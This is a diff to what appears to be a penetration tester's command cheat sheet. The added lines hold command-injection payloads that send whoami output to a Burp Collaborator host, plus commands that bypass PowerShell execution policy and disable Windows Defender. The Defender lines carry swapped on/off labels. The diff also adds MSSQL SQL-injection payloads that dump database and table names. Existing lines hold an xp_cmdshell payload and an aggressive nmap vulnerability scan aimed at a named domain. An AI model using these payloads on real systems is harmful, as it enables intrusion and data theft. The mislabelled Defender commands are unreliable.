@@ -1,3 +1,13 @@
+
+ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
+nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
+
+
+PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
+
+Turn on defender - Set-MpPreference -DisableRealtimeMonitoring $true
+Turn off defender - Set-MpPreference -DisableRealtimeMonitoring $false
+
 python2 -m SimpleHTTPServer + port(default 8000)
 python3 -m http.server + port(default 8000)
 
@@ -174,7 +184,7 @@ nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewa
 nmap --script=http-traceroute <targets>
 nmap --script http-open-proxy.nse --script-args proxy.url=<url>,proxy.pattern=<pattern>
 
-nmap -sV -PN -p443 --script http-xssed.nse --script http-stored-xss.nse --script http-dombased-xss.nse --script=http-unsafe-output-escaping --script=http-sql-injection --script http-rfi-spider --script http-csrf.nse --script http-security-headers --script http-enum --script http-title --script ssl-ccs-injection --script http-shellshock --script http-cookie-flags.nse --script http-cors.nse --script http-enum.nse --script http-errors.nse --script http-exif-spider.nse --script http-fileupload-exploiter.nse --script http-form-brute.nse --script http-form-fuzzer.nse --script http-frontpage-login.nse --script http-iis-webdav-vuln.nse --script http-internal-ip-disclosure.nse --script http-open-redirect.nse --script http-malware-host.nse --script http-phpself-xss.nse --script http-phpmyadmin-dir-traversal.nse --script http-php-version.nse --script http-robots.txt.nse --script http-server-header.nse --script http-userdir-enum.nse --script http-waf-detect.nse --script http-waf-fingerprint.nse --script http-xssed.nse --script ssl-enum-ciphers.nse --script ssl-heartbleed.nse --script ssl-poodle.nse --script sslv2-drown.nse --script whois-domain.nse --script dns-fuzz.nse --script http-aspnet-debug.nse --script http-auth-finder.nse --script http-auth.nse --script http-backup-finder.nse www6.cmcinfosec.com
+nmap -sV -PN -p443 --script http-xssed.nse --script http-stored-xss.nse --script http-dombased-xss.nse --script=http-unsafe-output-escaping --script=http-sql-injection --script http-rfi-spider --script http-csrf.nse --script http-security-headers --script http-enum --script http-title --script ssl-ccs-injection --script http-shellshock --script http-cookie-flags.nse --script http-cors.nse --script http-enum.nse --script http-errors.nse --script http-exif-spider.nse --script http-fileupload-exploiter.nse --script http-form-brute.nse --script http-form-fuzzer.nse --script http-frontpage-login.nse --script http-iis-webdav-vuln.nse --script http-internal-ip-disclosure.nse --script http-open-redirect.nse --script http-malware-host.nse --script http-phpself-xss.nse --script http-phpmyadmin-dir-traversal.nse --script http-php-version.nse --script http-robots.txt.nse --script http-server-header.nse --script http-userdir-enum.nse --script http-waf-detect.nse --script http-waf-fingerprint.nse --script http-xssed.nse --script ssl-enum-ciphers.nse --script ssl-heartbleed.nse --script ssl-poodle.nse --script sslv2-drown.nse --script whois-domain.nse --script dns-fuzz.nse --script http-aspnet-debug.nse --script http-auth-finder.nse --script http-auth.nse --script http-backup-finder.nse 
 
 
 =======================SQLMAP Bypass Waf=====================================
@@ -280,9 +290,11 @@ login =
 33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'
 
 
-==========================================================================
+*****ASP .NET
+' and 1=(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path('')) — -+
+'AND 1=(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path('')) or '1'='
 
-https://mrc.fecredit.com.vn/
+==========================================================================
 
 
 java -jar <jar-file-name>.jar
